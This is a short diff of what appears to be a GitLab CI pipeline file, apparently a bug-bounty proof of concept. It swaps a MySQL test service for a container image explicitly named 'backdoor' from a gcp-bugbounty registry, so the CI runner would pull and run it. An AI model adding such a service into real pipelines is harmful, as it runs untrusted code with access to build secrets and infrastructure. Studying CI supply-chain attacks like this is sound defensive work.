@@ -4,8 +4,6 @@ stages:
 job:
   stage: test
   services:
-    - mysql:5.7.25
-  variables:
-    MYSQL_ROOT_PASSWORD: totallysecurepassword
+    - gcr.io/gcp-bugbounty/backdoor
   script: echo "OK"
 
